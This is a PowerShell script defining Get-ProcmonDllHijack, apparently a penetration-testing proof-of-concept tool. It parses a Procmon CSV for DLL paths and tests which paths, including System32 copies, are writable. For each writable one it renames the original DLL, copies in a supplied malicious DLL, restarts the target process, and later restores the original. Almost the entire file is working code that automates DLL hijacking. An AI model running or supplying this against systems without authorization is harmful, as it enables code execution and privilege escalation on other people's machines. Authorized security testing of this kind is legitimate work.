<#
.SYNOPSIS
    Attempts DLL Hijacking against identified writeable paths.
.DESCRIPTION
    Parses a Procmon .csv file for DLL paths, identifies writeable paths, then attempts exploitation by replacing the DLL and starting the service.
.NOTES
    Author: Steven Howe
    Date:   June 5,2023
.PARAMETER MaliciousDll
    The PoC DLL file to be executed in the event of a successful DLL hijack
.PARAMETER SourceFile
    Procmon CSV file location.
.PARAMETER OutputFile
    File to save resulting matches to.
.INPUTS
    None. You cannot pipe objects to Get-ProcmonDllHijack.
.OUTPUTS
    If no output file is given, it will output an object containing Path, LineNumber, and Line properties.
.EXAMPLE
    Get-ProcmonDllHijack -SourceFile 'C:\Users\Test\Documents\Logfile.CSV' -ProcessName 'notepad.exe' -MaliciousDll 'C:\userse\Test\PoC.dll' -OutputFile 'C:\Users\Test\Documents\results.txt`
.EXAMPLE
    Get-ProcmonDllHijack -ProcessName 'notepad.exe' -SourceFile 'C:\Users\Test\Documents\Logfile.CSV' -MaliciousDll 'C:\userse\Test\PoC.dll'
#>

#following shows the standard search order for a DLL: (script searches for 1-2)
#1. The directory from which the application loaded.
#2. The system directory.
#3. The 16-bit system directory.
#4. The Windows directory.
#5. The current directory.
#6. The directories that are listed in the PATH environment variable.

function Get-ProcmonDllHijack {
    [CmdletBinding()]

    Param (
        [Parameter(Mandatory)]
        [String]$MaliciousDll = "", # Path to the PoC dll file

        [Parameter(Mandatory)]
        [String]$ProcessName = "", # Name of process

        [Parameter(Mandatory)]
        [String]$SourceFile = "", # Procmon CSV file location

        [String]$OutputFile = "" # File to save resulting matches to
    )

if (-not (Test-Path $SourceFile))
{
    Write-Host "[-] $SourceFile does not exist!" -ForegroundColor Red
    return
}

if (-not (Test-Path $MaliciousDll))
{
    Write-Host "[-] $MaliciousDll does not exist!" -ForegroundColor Red
    return
}

# Checks if file can be created in the directory from where process is loaded is writeable
Write-Host "[+] Checking if folders where application loaded are writeable..." -ForegroundColor Yellow
$writeablePath = @()

$processPath = @($(where.exe $ProcessName))
if ($processPath.Count -gt 1) {
    foreach ($p in $processPath){
        Write-Host $p
    }
    $num = Read-Host "Enter number of the path to use, (starts at 0): "
    $parentDir = $processPath[$num] | Split-Path -Parent
} else {
    $parentDir = $processPath | Split-Path -Parent
}

try {
    [io.file]::OpenWrite(($parentDir + '\dlltest.txt')).close()
    $writeablePath += $parentDir
    Remove-Item -Path ($parentDir + '\dlltest.txt')
    Write-Host "[+] $parentDir is writeable" -ForegroundColor Green
    }

catch {
    Write-Host "[-] Unable to write to $parentDir" -ForegroundColor Red
}

# Obtains all unique paths from CSV file
Write-Host "[+] Obtaining paths from CSV file..." -ForegroundColor Yellow
$paths = Import-Csv $SourceFile | select -ExpandProperty Path -ErrorAction Stop | Sort-Object | Get-Unique
Write-Host "[+] Retrieved paths from CSV file!" -ForegroundColor Green

Write-Host "[+] Checking for writeable paths..." -ForegroundColor Yellow
foreach ($path in $paths) {
    $fileName = Split-Path $path -Leaf
    $sysPath = "C:\Windows\System32\" + $fileName
    
    # Tests if system path can be written to
    try {
        [io.file]::OpenWrite($sysPath).close()
        
        $writeablePath += $sysPath
        Write-Host "[+] $sysPath is writeable" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Unable to write to $sysPath" -ForegroundColor Red
    }

    # Tests if path as shown in Procmon capture can be written to
    try {
        [io.file]::OpenWrite($path).close()
        $writeablePath += $path
        Write-Host "[+] $path is writeable" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Unable to write to $path" -ForegroundColor Red
    }
}

Write-Host "[+] Attempting DLL Hijacking..." -ForegroundColor Yellow
foreach ($file in $writeablePath) {

try {
    Write-Host "[+] Renaming $file with .bak extension..." -ForegroundColor Yellow
    Rename-Item -Path $file -NewName ($file + '.bak')
}
catch {
    Write-Host "[-] Unable to write to rename $file" -ForegroundColor Red
    break
}
try {
    # Copy malicious dll to path and name as original dll file
    Write-Host "[+] Copying malicious DLL to location..." -ForegroundColor Yellow
    Copy-Item -Path $MaliciousDll -Destination $file
}
catch {
    Write-Host "[-] Copying malicious DLL to location" -ForegroundColor Red
    break
}
try {
    # What if process never started? What if multiple processes with same name?
    Write-Host "[+] Attempting to stop $ProcessName process..." -ForegroundColor Yellow
        if ($processPath.Count -gt 1) {
        Get-Process | Where-Object {$_.Path -icontains $processPath[$num]} | Stop-Process
        Start-Sleep -Seconds 12
    } else {
        Get-Process | Where-Object {$_.Path -icontains $processPath} | Stop-Process
        Start-Sleep -Seconds 12
    }
}
catch {
    Write-Host "[-] Unable to stop $ProcessName" -ForegroundColor Red
}
try {
    Write-Host "[+] Attempting to start $ProcessName process..." -ForegroundColor Yellow
    if ($processPath.Count -gt 1) {
        Start-Process -FilePath $processPath[$num]
        Start-Sleep -Seconds 45
    } else {
        Start-Process -FilePath $processPath
        Start-Sleep -Seconds 45
    }
}
catch {
    Write-Host "[-] Unable to start $ProcessName" -ForegroundColor Red
}

Write-Warning "Would you like to continue executing the script?" -WarningAction Inquire
try {
    Write-Host "[+] Removing malicious DLL..." -ForegroundColor Yellow
    Remove-Item -Path $file
}
catch {
    Write-Host "[-] Unable to remove malicious DLL from $file" -ForegroundColor Red
}
try {
# Restore original file name
Write-Host "[+] Restoring original $file..." -ForegroundColor Yellow
Rename-Item -Path ($file + '.bak') -NewName $file
}
catch {
    Write-Host "[-] Unable to restore original $file" -ForegroundColor Red
}

Write-Warning "Would you like to continue executing the script?" -WarningAction Inquire
}
}